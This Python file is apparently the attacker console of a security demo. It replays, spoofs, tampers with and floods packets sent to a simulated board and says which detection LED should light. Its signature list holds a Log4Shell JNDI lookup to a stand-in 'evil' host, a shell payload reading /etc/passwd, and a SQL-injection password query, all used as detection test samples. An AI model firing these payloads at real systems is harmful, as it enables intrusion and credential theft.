#!/usr/bin/env python3
"""
demo_sim/attacker_sim.py -- Device C (simulation). Same commands as the real console.

  join-bad  join  say <t>  tamper <t>  wrongkey <t>  inject [1-3]  replay
  nosession <t>  spoof <t>  flood [n]  crc  truncated  scan  auto  help  quit
"""
import random
from sim_common import *

SIGS = [b"GET /?x=${jndi:ldap://evil/a} HTTP/1.1\r\n\r\n",
        b"POST /shell HTTP/1.1\r\n\r\nid; whoami; cat /etc/passwd",
        b"GET /?q=1 UNION+SELECT password FROM users-- HTTP/1.1\r\n\r\n"]
HELP = __doc__


class C:
    def __init__(self):
        self.l = Link("C")
        self.up = False

    def need(self):
        if not self.up:
            print(f"{Y}[C] no session yet. Run `join` first.{X}")
        return self.up

    def join_bad(self):
        print("[C] sending a public key that is the wrong length (700 B)")
        key, _ = self.l.handshake(bad_key=True)
        print(f"{Y}[C] no reply from the board. Expect LD0 fast blink, no session for me.{X}")

    def join(self):
        print("[C] generating my own key pair, sending public key (800 B)")
        key, dt = self.l.handshake()
        if not key:
            print(f"{R}[C] no reply{X}")
            return
        self.up = True
        print(f"{G}[C] handshake accepted. I hold a valid key ({key.hex()[:8]}...).{X}")

    def say(self, t):
        if self.need():
            self.l.send_data(t.encode())
            print("[C] sent (valid). B will see this.")

    def tamper(self, t):
        if self.need():
            self.l.send_data(t.encode(), corrupt=True)
            print(f"{Y}[C] flipped a tag bit. Expect LD7; B sees nothing.{X}")

    def wrongkey(self, t):
        if self.need():
            self.l.send_data(t.encode(), key=os.urandom(32))
            print(f"{Y}[C] encrypted with a key I made up. Expect LD7; B sees nothing.{X}")

    def inject(self, n):
        if self.need():
            self.l.send_data(SIGS[(n - 1) % 3])
            print(f"{Y}[C] correct tag, but the text is a known attack. Expect LD4; B sees nothing.{X}")

    def replay(self):
        if self.need() and self.l.last:
            send(self.l.sock, self.l.last)
            print(f"{Y}[C] resent an old packet byte for byte. Expect LD7: the board's counter moved on. "
                  f"My own session is now out of step: run `join` again to recover.{X}")

    def nosession(self, t):
        print("[C] DATA on my link before I have shaken hands at all")
        saved = self.l.ctr
        p = self.l.packet(t.encode(), key=os.urandom(32))
        self.l.ctr = saved
        send(self.l.sock, p)
        print(f"{Y}[C] Expect LD7 (BAD_TAG): the board holds no key for this link.{X}")

    def spoof(self, t):
        # The one attack worth staging: lie about WHO I am, not about the message.
        print("[C] Claiming to be Device A: handshake and data both labelled 'A',")
        print("[C] sent down my own cable.")
        key, _ = self.l.handshake()
        if not key:
            print(f"{R}[C] no reply{X}")
            return
        self.up = True
        p = self.l.packet(t.encode())
        p["as"] = "A"
        send(self.l.sock, p)
        print(f"{Y}[C] The board logs the claim and ignores it. Identity is the link I "
              f"came in on, so I am filed as C, with C's key.{X}")
        print(f"{Y}[C] It is relayed -- as a message from C. Then let A type something: "
              f"A's key was never overwritten and A's counter never moved.{X}")

    def flood(self, n):
        if not self.need():
            return
        print(f"[C] flooding with {n} valid, tagged, empty packets")
        for _ in range(n):
            self.l.send_data(b"")
        print(f"{Y}[C] Expect LD5 once the rate passes the threshold.{X}")

    def raw(self, kind, expect):
        self.l.raw(kind)
        print(f"{Y}[C] {expect}{X}")

    def auto(self):
        steps = [("Recon: try a bad key", self.join_bad), ("Join properly", self.join),
                 ("Blend in", lambda: self.say("hi, checking in")),
                 ("Alter a message in flight", lambda: self.tamper("send me the report")),
                 ("Try a made-up key", lambda: self.wrongkey("let me in")),
                 ("Probe the web app", lambda: self.inject(1)),
                 ("Pretend to be Device A", lambda: self.spoof("I am totally A")),
                 ("Knock it over", lambda: self.flood(400)),
                 ("Replay an old packet (this desyncs my own session)", self.replay)]
        for label, fn in steps:
            print(f"\n{BOLD}--- {label} ---{X}")
            fn()
            time.sleep(2.5 + random.uniform(0, 0.8))


def main():
    c = C()
    print(f"{BOLD}Device C console{X} {D}[SIMULATION]{X}\n{HELP}")
    while True:
        try:
            line = input("C> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not line:
            continue
        cmd, _, arg = line.partition(" ")
        try:
            if cmd in ("quit", "exit"): break
            elif cmd == "help": print(HELP)
            elif cmd == "join": c.join()
            elif cmd == "join-bad": c.join_bad()
            elif cmd == "say": c.say(arg or "hello")
            elif cmd == "tamper": c.tamper(arg or "tampered")
            elif cmd == "wrongkey": c.wrongkey(arg or "guess")
            elif cmd == "inject": c.inject(int(arg or 1))
            elif cmd == "replay": c.replay()
            elif cmd == "nosession": c.nosession(arg or "knock knock")
            elif cmd == "spoof": c.spoof(arg or "I am totally A")
            elif cmd == "flood": c.flood(int(arg or 400))
            elif cmd == "crc": c.raw("crc", "frame with a bad checksum. Expect LD1.")
            elif cmd == "truncated": c.raw("truncated", "frame that stops mid-way. Expect LD2.")
            elif cmd == "malformed": c.raw("malformed", "illegal header. Expect LD3.")
            elif cmd == "scan": c.raw("scan", "port sweep. Expect LD3 today (scan detector never gets a vote).")
            elif cmd == "auto": c.auto()
            else: print("unknown command (try help)")
        except Exception as e:
            print(f"{R}[C] error: {e}{X}")


if __name__ == "__main__":
    main()
